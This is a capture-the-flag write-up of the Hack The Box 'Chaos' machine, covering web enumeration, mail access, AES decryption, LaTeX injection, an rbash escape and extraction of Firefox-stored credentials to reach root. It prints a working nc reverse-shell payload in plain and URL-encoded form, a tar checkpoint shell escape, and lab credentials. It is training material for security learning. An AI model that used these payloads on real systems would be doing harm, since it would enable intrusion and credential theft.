### Quick Summary
#### Hey guys today Chaos retired and here's my write-up about it. Chaos was a CTF-style machine, I can't say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as `www-data` we will exploit a web application that used [`LaTeX`](https://en.wikipedia.org/wiki/LaTeX). After that we will escalate privileges to another user and escape `rbash`. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It's a Linux box and its ip is `10.10.10.120`, I added it to `/etc/hosts` as `chaos.htb`. Let's jump right in.

### Nmap
#### As always we will start with `nmap` to scan for open ports and services :
`nmap -sV -sT -sC chaos.htb`
![](/images/hackthebox/chaos/1.png)
#### We got some ports. `http` on port 80 and 10000, email related services (`imap`, `pop3`) running on ports 110, 143, 993 and 995. Let's check `http`.
<br>

### HTTP Initial Enumeration
#### Port 10000 gave me this error :
![](/images/hackthebox/chaos/2.png)
#### So I switched to `https` and got a login form :
![](/images/hackthebox/chaos/3.png)
#### We don't have any credentials and I ran `gobuster` and got nothing interesting so we will ignore this and look at port 80.
![](/images/hackthebox/chaos/4.png)
#### It's just a normal website, rest of it :

![](/images/hackthebox/chaos/8.png)
#### I checked that contact form and it's doing nothing. I ran `gobuster` on `chaos.htb` and got these results :
```

#### And now this part is tricky. Because going to the ip of the box `10.10.10.120` instead of `chaos.htb` will give us a different thing (virtual hosting). 
![](/images/hackthebox/chaos/9.png)
#### It's saying `Direct IP not allowed`. I ran another `gobuster` scan on the ip and got different results :

#### On `chaos.htb` the thing the caught my attention was `/source` so I checked that and it didn't have anything : 
![](/images/hackthebox/chaos/10.png)
#### I checked `http://10.10.10.120/wp` and found a `wordpress` website :
![](/images/hackthebox/chaos/11.png)
<br>
<br>
![](/images/hackthebox/chaos/12.png)
#### I looked at the posts, there was only one post and it was password protected :
![](/images/hackthebox/chaos/13.png)
#### I clicked on the post link and saw that the author of the post is called `human` : 
![](/images/hackthebox/chaos/14.png)
#### Before trying to bruteforce the password I tried some basic stuff first and the `username:username` type of credentials worked. The password was `human` :
![](/images/hackthebox/chaos/15.png)
<br>
<br>
![](/images/hackthebox/chaos/16.png)
#### And we got some credentials for mail : `ayush:jiujitsu`
<br>
<hr>
### Accessing the e-mail Service, Decrypting Secret Message
#### We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used `claws-mail` (can be installed with apt) and configured it like this :

Hii, sahay
Check the enmsg.txt
You are the password XD.
Also attached the script which i used to encrypt.
Thanks,
Ayush
```
#### After the message he attached two files : `enim_msg.txt` and `en.py`. He said `you are the password`, so first guess ... password most likely will be `sahay`. 
#### `enim_msg.txt` is the encrypted message :
![](/images/hackthebox/chaos/19.png)
#### And `en.py` is the script used to encrypt the message :
![](/images/hackthebox/chaos/20.png)
```
def encrypt(key, filename):
    chunksize = 64*1024
    outputFile = "en" + filename
    filesize = str(os.path.getsize(filename)).zfill(16)
    IV =Random.new().read(16)

    encryptor = AES.new(key, AES.MODE_CBC, IV)

    with open(filename, 'rb') as infile:
        with open(outputFile, 'wb') as outfile:
            outfile.write(filesize.encode('utf-8'))
            outfile.write(IV)

            while True:
                chunk = infile.read(chunksize)

                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))

                outfile.write(encryptor.encrypt(chunk))

def getKey(password):
            hasher = SHA256.new(password.encode('utf-8'))
            return hasher.digest()
```
#### By looking at the encryption script we will know that the message is  AES encrypted. I used this [tool](https://github.com/happygirlzt/Cryptography/blob/master/encrypt.py) to decrypt the message :
![](/images/hackthebox/chaos/21.png)
#### Password `sahay` worked. The decrypted message was saved in a file called `t`. It was base64 encoded so I had to decode it :
![](/images/hackthebox/chaos/22.png)
```
Hii Sahay

Please check our new service which create pdf

p.s - As you told me to encrypt important msg, i did :)

http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3

Thanks,

```
#### We got a link : `http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3`, Let's check that.

### Exploiting `LaTeX`, Reverse Shell as `www-data`
![](/images/hackthebox/chaos/23.png)
#### It's a web application that creates pdfs, There's a field for input and 3 templates to choose from (`test1`, `test2`, `test3`) before trying to create a pdf I ran `gobuster` and got these results :

#### `/doc` :

![](/images/hackthebox/chaos/26.png)
#### Nothing important, just some documentation pdfs. There was a directory called `latex`, this reveals that the web app is using `LaTeX`. 
#### `/pdf` :
![](/images/hackthebox/chaos/27.png)
#### This is where the created pdfs are saved, I looked at some of them and they were just tests. Like this one for example : 
![](/images/hackthebox/chaos/28.png)
#### I tried to create a pdf and intercepted the request with burp : 
![](/images/hackthebox/chaos/29.png)
#### The response showed a full log which revealed type and version of the backend software used to create the pdfs.
![](/images/hackthebox/chaos/30.png)
#### However the first template failed :
![](/images/hackthebox/chaos/31.png)
#### `test2` worked fine :
![](/images/hackthebox/chaos/32.png)
<br>
<br>
![](/images/hackthebox/chaos/33.png)
#### `test3` as well. `LaTeX` can be injectable and can cause some vulnerabilities if there wasn't a good filter. I tried some payloads from [Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection) and most of them got filtered. But this injection payload worked : `\immediate\write18{command}`. So I got a reverse shell like this :
![](/images/hackthebox/chaos/34.png)
#### Payload : `\immediate\write18{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f}` 
#### Url Encoded : `\immediate\write18{rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.xx.xx+1337+>/tmp/f}`
![](/images/hackthebox/chaos/35.png)
#### We got a reverse shell as `www-data`, There are two users on the box : `sahay` and `ayush`. We need to be one of them :
![](/images/hackthebox/chaos/36.png)
<hr>
### Privilege Escalation to `ayush`, Bypassing `rbash`, User Flag
#### We got earlier `ayush` credentials for mail : `ayush:jiujitsu` let's try that password :
![](/images/hackthebox/chaos/37.png)
#### It worked but we are in a restricted bash shell now. 
#### [This guide](https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf) is useful for bypassing restricted shells. I tried some commands to know what can I do from that shell and I could run `tar`. So I went back to `www-data` and went to `/tmp`.
#### I created a file and called it `rick` : `touch rick`
#### Then I added that file to a tar archive and called it `rick.tar` : `tar -cvf rick.tar rick`
#### I went back to `ayush` and used `tar` to bypass the shell : `tar cf /dev/null rick.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash`
#### After that I just had to fix my path and I had a functioning bash shell : `export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`
![](/images/hackthebox/chaos/38.png)
#### Now we can read the user flag :
![](/images/hackthebox/chaos/39.png)
#### We owned user.
<hr>
### Extracting Credentials from Firefox Profile, Privilege Escalation and Root Flag
#### By looking at the `/home` directory for `ayush` I saw something strange : 
![](/images/hackthebox/chaos/40.png)
#### There was a `.mozilla` data directory there. I went there and there was a directory for Firefox and it had a profile :
![](/images/hackthebox/chaos/41.png)
#### We can use a tool called [firefox decrypt](https://github.com/unode/firefox_decrypt) and pass that profile to it. This tool extracts credentials from Firefox profiles.
#### I had to get the `firefox` directory on my box first, I ran a python simple http server on port 1919 in `/home/ayush/.mozilla/firefox` then on my box I created a directory called `firefox` and downloaded the contents of the original `firefox` directory from the simple http server : `wget http://chaos.htb:1919/ --recursive`.
#### Server Log :
![](/images/hackthebox/chaos/42.png)
#### Downloaded files were saved in a directory called `chaos.htb:1919`.
#### After that I used `firefox_decrypt.py` and gave it the profile which was called `bzo7sjt1.default` : 
`./firefox_decrypt.py ../firefox/chaos.htb\:1919/bzo7sjt1.default/`
![](/images/hackthebox/chaos/43.png)
#### It asked for a password, I gave `ayush`'s password (`jiujitsu`) and it worked. We got credentials for the application that was running on port 10000 and the username was `root` : `root:Thiv8wrej~`.
#### I didn't go to port 10000 again, I tried `su root` first with this password and it worked :
![](/images/hackthebox/chaos/44.png)
#### We owned root !
